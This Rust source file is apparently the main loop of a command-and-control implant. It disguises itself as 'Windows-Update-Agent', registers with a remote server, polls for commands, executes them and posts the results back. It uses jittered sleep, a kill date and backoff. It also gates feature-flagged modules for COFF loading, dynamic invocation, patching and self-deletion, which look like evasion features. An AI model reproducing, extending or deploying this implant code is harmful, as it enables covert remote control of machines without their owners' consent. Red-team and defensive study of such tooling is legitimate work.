pub(crate) mod client;
pub(crate) mod commands;
pub(crate) mod config;
pub(crate) mod crypto;
pub(crate) mod debug;
pub(crate) mod http;
pub(crate) mod win_utils;

#[cfg(feature = "risky")]
pub(crate) mod coff_loader;

#[cfg(feature = "risky")]
pub(crate) mod dinvoke;

#[cfg(feature = "risky")]
pub(crate) mod patches;

#[cfg(feature = "selfdelete")]
pub(crate) mod self_delete;

use crate::app::client::Client;
use crate::app::commands::handle_command;
use crate::app::config::Config;
use crate::app::debug::debug_println;
use rand::Rng;

pub const VERSION: &str = "Windows-Update-Agent";

pub fn main() {
    // Print the version header
    println!("{VERSION}");

    // Create a new Config object
    let config = Config::new().unwrap_or_else(|_e| {
        debug_println!("Failed to initialize config: {_e}");
        std::process::exit(1);
    });

    // Create and initialize a new Client object
    let mut client = Client::new(config);
    client.init().unwrap_or_else(|_e| {
        debug_println!("Failed to initialize client: {_e}");
        std::process::exit(1);
    });

    // Initialize counters for exponential sleep backoff
    let mut attempts = 0;
    let max_attempts = 5;

    loop {
        // Check if the kill date of the client (yyyy-MM-dd) is in the past, if so, kill the process
        if chrono::NaiveDate::parse_from_str(&client.kill_date, "%Y-%m-%d")
            .unwrap_or_else(|_| (chrono::Local::now() - chrono::Duration::days(1)).date_naive()) // Default to yesterday if parsing fails
            .lt(&chrono::Local::now().date_naive())
        {
            debug_println!("Kill date reached, exiting...");
            std::process::exit(0);
        }

        // Initialize our client if it hasn't been initialized yet
        if !client.initialized {
            debug_println!("Initializing client...");
            match client.server_init() {
                Ok(()) => {
                    attempts = 0;
                }
                Err(_e) => {
                    attempts += 1;
                    debug_println!("Failed to initialize client ({attempts}/{max_attempts}): {_e}");
                }
            }
        }

        // Register our client if it hasn't been registered yet
        if client.initialized && !client.registered {
            debug_println!("Registering client...");
            match client.register() {
                Ok(()) => {
                    attempts = 0;
                }
                Err(_e) => {
                    attempts += 1;
                    debug_println!("Failed to register client ({attempts}/{max_attempts}): {_e}");
                }
            }
        }

        // Get the command
        if client.initialized && client.registered {
            let (guid, command, args) = match client.get_command() {
                Ok((guid, command, args)) => {
                    attempts = 0;
                    (guid, command, args)
                }
                Err(_e) => {
                    attempts += 1;
                    debug_println!("Failed to get command ({attempts}/{max_attempts}): {_e}");

                    // If we failed a number of check-ins, retry registration
                    if attempts > max_attempts {
                        debug_println!("Hit maximum retry count, attempting re-registration...");
                        attempts = 0;
                        client.initialized = false;
                        client.registered = false;
                    }

                    (String::new(), String::new(), Vec::new())
                }
            };

            // Handle execution and result submission
            if !command.is_empty() {
                debug_println!(
                    "Got command: '{}' with args '{:?}' [guid '{}']",
                    command,
                    args,
                    guid
                );
                let result = handle_command(&command, &args, &mut client, &guid);
                if !result.is_empty() {
                    client
                        .post_command_result(&guid, &result)
                        .unwrap_or_else(|_e| {
                            debug_println!("Failed to post command result: {_e}");
                        });
                }
            }
        }

        // Check if we passed the attempt limit
        if attempts > max_attempts {
            debug_println!("Max attempts reached, exiting...");
            std::process::exit(0);
        }

        // Calculate the base sleep time based on the configured sleep and jitter time
        let mut sleep_time = match client.sleep_jitter {
            n if n == 0.0 => f64::from(client.sleep_time),
            _ => {
                f64::from(client.sleep_time)
                    - (f64::from(client.sleep_time)
                        * (rand::thread_rng().gen_range(-client.sleep_jitter..client.sleep_jitter)))
            }
        };

        // Set a minimum of 10ms to prevent instability when sleep is 0.0s
        if sleep_time < 0.01 {
            sleep_time = 0.01;
        }

        // Calculate the exponential back-off
        if attempts != 0 {
            sleep_time *= 3f64.powi(attempts - 1);
        }

        // Sleep for the calculated time
        debug_println!("Sleeping for {:.1} seconds", sleep_time);
        std::thread::sleep(std::time::Duration::from_secs_f64(sleep_time));
    }
}
